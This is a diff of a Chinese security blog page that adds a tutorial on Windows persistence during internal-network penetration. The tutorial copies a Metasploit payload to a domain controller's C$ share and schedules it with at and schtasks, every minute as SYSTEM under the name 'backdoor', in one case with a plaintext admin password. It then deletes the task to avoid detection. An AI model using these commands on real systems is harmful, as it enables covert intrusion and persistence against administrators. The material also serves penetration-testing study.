@@ -454,21 +454,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-04-16
+                    2022-05-02
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    0
+                    660
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    2 分
                 </div>
                 
 
@@ -486,7 +486,43 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                
+                <h1 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h1><p>为了使后门更加持久化，我们使用计划任务，定时上线木马。</p>
+<p>我们可以通过at命令通过跳板机在目标主机DC上创建计划任务，让计算机在指定的时间执行木马程序，从而获得对内网目标主机的控制。</p>
+<h3 id="利用at命令具体实现："><a href="#利用at命令具体实现：" class="headerlink" title="利用at命令具体实现："></a>利用at命令具体实现：</h3><p>使用net time命令确定目标主机DC的当前时间：</p>
+<pre class="line-numbers language-none"><code class="language-none">net time \\192.168.183.130（主机IP）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>然后使用copy命令远程操作，将metasploit生成的payload文件复制到目标系统C盘中：</p>
+<pre class="line-numbers language-none"><code class="language-none">copy shell.exe \\192.168.183.130\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>接着使用at命令创建计划任务，让目标主机DC在指定的时间运行metasploit木马程序：</p>
+<pre class="line-numbers language-none"><code class="language-none">at \\192.168.183.130 18:53:00 c:\shell.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>最后，我们使用完计划任务后，还需要将该计划任务删除，以免被网管理员发现：</p>
+<pre class="line-numbers language-none"><code class="language-none">at \\192.168.183.130 1 /delete
+// 1为计划任务的ID<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h3 id="利用-schtasks-命令具体实现："><a href="#利用-schtasks-命令具体实现：" class="headerlink" title="利用 schtasks 命令具体实现："></a>利用 <strong>schtasks 命令</strong>具体实现：</h3><p>at命令已经被Windows Vista、Windows Server 2008及之后版本的操作系统废弃了，代替他的是schtasks命命令。schtasks命令比at命令更为灵活、自由。</p>
+<ol>
+<li><p>使用copy命令远程操作，将metasploit生成的payload文件shell.exe复制到目标系统C盘中。</p>
+</li>
+<li><p>在目标主机DC上创建一个名称为“backdoor”的计划任务。该计划任务每分钟启动一次，启动程序为我们之前到C盘下的shell.exe，启动权限为system。命令如下：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">schtasks /create /s <span class="token number">192.168</span>.183.130 /tn backdoor /sc minute /mo <span class="token number">1</span>  /tr c:<span class="token punctuation">\</span>shell.exe /ru system /f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>在没有建立ipc连接时，要加上/u和/p参数分别设置用户名和密码。有些时候，由于当前权限或组策略设置等原因，该schtasks方法远程创建计划任务可能会报错拒绝访问。</p>
+<p>遇到这种情况，我们可以加上/u和/p参数分别设置高权限用户名和密码，如下：</p>
+<pre class="line-numbers language-none"><code class="language-none">schtasks /create /s 192.168.183.130 /u administrator /p Liu78963 /tn backdoor /sc minute /mo 1 /tr c:\shell.exe /ru system /f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</li>
+<li><p>然后执行如下命令立即运行该计划任务</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">schtasks /run /s <span class="token number">192.168</span>.183.130 /i /tn backdoor <span class="token comment"># i：忽略任何限制立即运行任务schtasks </span>
+/run /s <span class="token number">192.168</span>.183.130 /i /tn backdoor /u administrator /p Liu78963   <span class="token comment"># 遇到上面所说的报错时执行加上/u和/p参数分别设置高权限用户名和密码</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+</li>
+<li><p>计划任务成功运行后，执行如下命令强制删除该计划任务：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">schtasks /delete /s <span class="token number">192.168</span>.183.130 /tn <span class="token string">"backdoor"</span> /f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</li>
+<li><p>立即启动该计划任务：</p>
+<pre class="line-numbers language-none"><code class="language-none">schtasks /run /s 192.168.183.130 /i /tn test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+</ol>
+
                 
             </div>
             <hr/>
@@ -1007,7 +1043,7 @@
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            内网渗透比较系统的讲解
+                            一些综合性问题
                         
                     </div>
                     <div class="publish-info">
